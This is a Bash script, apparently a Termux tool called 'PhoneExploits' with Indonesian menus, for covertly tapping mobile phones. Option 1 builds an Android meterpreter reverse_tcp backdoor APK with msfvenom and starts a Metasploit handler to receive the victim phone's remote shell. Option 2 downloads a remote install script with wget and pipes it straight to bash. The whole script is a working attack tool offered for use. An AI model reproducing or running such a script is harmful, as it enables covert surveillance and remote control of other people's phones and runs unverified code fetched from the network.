#!/bin/bash
#version 1.0
#Mao Ngapain?
#Mao Recode?
#Utamakan Izin Dulu^_^
#variabels
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'

load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
start1(){
             echo""
             echo""
             sleep 1
             echo $g"1. sadap handphone jarak jauh"
             sleep 1
             echo $g"2. sadap handphone satu jaringan (root)"
             sleep 1
             echo $g"3. exit"
             echo""
             sleep 1
             echo $g"Masukkan Pilihan : " $nomor
             read nomor
             if [ $nomor = "1" ]; then
                   echo $g"Masukkan port : "
                   read lport
                   sleep 1
                   echo $g"Masukkan ip : "
                   read lhost
                   sleep 1
                   echo $g"Masukkan nama backdor.apk : "
                   read backdor
                   echo""
                   sleep 2
                   echo $g"=================================="
                   sleep 1
                   echo $y"               Data Backdor                "
                   sleep 1
                   echo $r" port : $lport"
                   sleep 1
                   echo $r" IP : $lhost"
                   sleep 1
                   echo $r" nama backdor : $backdor"
                   sleep 1
                   echo $g"=================================="
                   echo""
                   sleep 2
                   msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$backdor
                   sleep 5
                   echo $g"Backdor telah tersimpan di sdcard"
                   sleep 3
                   echo $g"Memulai penyadapan"
                   clear
                   echo $g"Loading.."
                   sleep 3
                   load
                   clear
                   banner
                   echo""
                   sleep 2
                   echo $g"Memulai Metasploit"
                   echo""
                   sleep 2
                   msfconsole -q -x "use exploit/multi/handler;
                   set payload android/meterpreter/reverse_tcp;
                   set lhost 127.0.0.1;
                   set lport $lport;
                   run"
             elif [ $nomor = "2" ]; then
                   echo $r"Pastikan Tersambung Dengan Wifi"
                   sleep 2
                   echo $b"Persiapan Pengambilan Data"
                   sleep 3
                   clear
                   apt install fish -y
                   pip2 install colorama
                   apt update > /dev/null 2>&1 && apt --assume-yes install wget > /dev/null 2>&1 && wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh -q && bash InstallTools.sh
                   fish
            elif [ $nomor = "3" ]; then
                   clear
                   echo $y"Terima Kasih Telah Menggunakan Tools Ini"
                   exit
            else
                   echo "Kesalahan"
                   mulai
            fi
}

mulai(){
            echo""
            sleep 1
            echo $r"Jika belum install metasploit, install dulu"
            sleep 1
            echo $g"Ingin Install Metasploit ?"
            read -p "y/n :" pill;
            if [ $pill = "y" ]; then
                    bash exploit
                    clear
                    banner
                    start1
            else
                    clear
                    banner
                    start1
            fi
}

banner(){
            sleep 1
            echo $b"  ____  _                      ____  _       _ _ "
            sleep 1
            echo $b" |  _ \| |__   ___  _ __   ___|  _ \| | ___ (_) |_ ___ "
            sleep 1
            echo $b" | |_) | '_ \ / _ \| '_ \ / _ \ |_) | |/ _ \| | __/ __| "
            sleep 1
            echo $y" |  __/| | | | (_) | | | |  __/  __/| | (_) | | |_\__ \ "
            sleep 1
            echo $y" |_|   |_| |_|\___/|_| |_|\___|_|   |_|\___/|_|\__|___/ v1.2"
            sleep 1
            echo""
            echo $y"  author : BLANK sixtysix-Team"
}
clear
load
clear
banner
mulai
